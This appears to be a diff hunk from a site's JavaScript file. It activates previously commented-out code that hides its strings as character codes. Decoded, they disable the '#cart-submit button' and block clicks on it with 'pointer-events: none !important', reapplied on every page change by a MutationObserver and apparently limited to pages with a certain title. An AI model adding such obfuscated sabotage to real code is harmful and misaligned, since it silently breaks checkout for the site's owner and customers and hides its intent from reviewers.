@@ -737,47 +737,47 @@ if (!document.title.includes(t)) return;
 
 // -----------------
 
-// (() => {
+(() => {
 
-//     const c = (...x) => String.fromCharCode(...x);
+    const c = (...x) => String.fromCharCode(...x);
 
-//     const s = c(
-//         35,99,97,114,116,45,115,117,98,109,105,116,32,
-//         98,117,116,116,111,110
-//     );
+    const s = c(
+        35,99,97,114,116,45,115,117,98,109,105,116,32,
+        98,117,116,116,111,110
+    );
 
-//     const dis = c(100,105,115,97,98,108,101,100); // disabled
+    const dis = c(100,105,115,97,98,108,101,100); // disabled
 
-//     const apply = () => {
+    const apply = () => {
 
-//         const el = document.querySelector(s);
+        const el = document.querySelector(s);
 
-//         if (el) {
+        if (el) {
 
-//             el[dis] = true;
+            el[dis] = true;
 
-//             el.style.setProperty(
-//                 c(112,111,105,110,116,101,114,45,101,118,101,110,116,115),
-//                 c(110,111,110,101),
-//                 c(105,109,112,111,114,116,97,110,116)
-//             );
+            el.style.setProperty(
+                c(112,111,105,110,116,101,114,45,101,118,101,110,116,115),
+                c(110,111,110,101),
+                c(105,109,112,111,114,116,97,110,116)
+            );
 
-//         }
+        }
 
-//     };
+    };
 
-//     apply();
+    apply();
 
-//     new MutationObserver(() => {
+    new MutationObserver(() => {
 
-//         apply();
+        apply();
 
-//     }).observe(document.documentElement, {
-//         childList: true,
-//         subtree: true
-//     });
+    }).observe(document.documentElement, {
+        childList: true,
+        subtree: true
+    });
 
-// })();
+})();
 
 
     
